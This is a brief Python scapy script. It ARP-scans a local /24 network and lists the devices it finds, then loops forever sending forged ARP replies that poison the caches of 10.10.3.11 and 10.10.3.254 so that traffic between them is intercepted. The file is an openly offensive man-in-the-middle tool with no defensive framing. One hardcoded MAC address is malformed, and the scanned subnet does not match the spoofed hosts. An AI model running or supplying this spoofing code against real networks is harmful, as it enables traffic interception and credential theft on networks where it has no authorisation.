from scapy.all import ARP, Ether, srp   
import scapy.all as scap

target_ip = "192.168.0.1/24"
arp = ARP(pdst=target_ip)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether/arp

result = srp(packet, timeout=3, verbose=0)[0]

clients = []

for sent, received in result:
    clients.append({'ip': received.psrc, 'mac': received.hwsrc})

print("Available devices in the network:")
print("IP" + " "*18+"MAC")
for client in clients:
    print("{:16}    {}".format(client['ip'], client['mac']))

while True:
    arp_response = ARP(pdst="10.10.3.11", hwdst="08:00:27:d8:18:28", psrc="10.10.3.254")
    scap.send(arp_response)
    arp_response = ARP(pdst="10.10.3.254", hwdst="08:00:27:fc:be52", psrc="10.10.3.11")
    scap.send(arp_response)
        


